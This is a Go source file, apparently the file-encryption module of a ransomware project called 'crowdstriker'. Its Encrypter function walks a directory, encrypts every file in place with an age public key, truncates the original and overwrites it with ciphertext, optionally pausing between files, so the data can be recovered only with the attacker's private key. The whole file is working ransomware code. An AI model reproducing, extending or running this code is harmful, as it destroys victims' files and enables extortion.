package encrypter

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"os"
	"time"

	"crowdstriker/explorer"

	"filippo.io/age"
)

func Encrypter(cryptoKey string, dir string, sleep ...time.Duration) {
	files := explorer.MapFiles(dir)

	for _, filePath := range files {

		file, err := os.OpenFile(filePath, os.O_RDWR, 0o644)
		if err != nil {
			fmt.Println("Error opening file:", err)
			continue
		}

		fmt.Println("Encrypting:", filePath)

		var buffer bytes.Buffer
		buffWriter := bufio.NewWriter(&buffer)

		err = AgeEncryptor(file, buffWriter, cryptoKey)
		if err != nil {
			fmt.Println("Error encrypting file:", err)
			file.Close()
			continue
		}

		err = buffWriter.Flush()
		if err != nil {
			fmt.Println("Error flushing buffer:", err)
			file.Close()
			continue
		}

		err = file.Truncate(0)
		if err != nil {
			fmt.Println("Error truncating file:", err)
			file.Close()
			continue
		}

		_, err = file.Seek(0, 0)
		if err != nil {
			fmt.Println("Error seeking file:", err)
			file.Close()
			continue
		}

		_, err = io.Copy(file, &buffer)
		if err != nil {
			fmt.Println("Error writing encrypted content to file:", err)
		}

		file.Close()
		fmt.Println("Encryption complete:", filePath)
		if len(sleep) != 0 {
			time.Sleep(sleep[0])
		}
	}
}

func AgeEncryptor(file *os.File, out io.Writer, publickey string) error {
	recipient, _ := age.ParseX25519Recipient(publickey)
	w, err := age.Encrypt(out, recipient)

	file.WriteTo(w)

	if err != nil {
		return err
	}
	defer w.Close()
	return nil
}
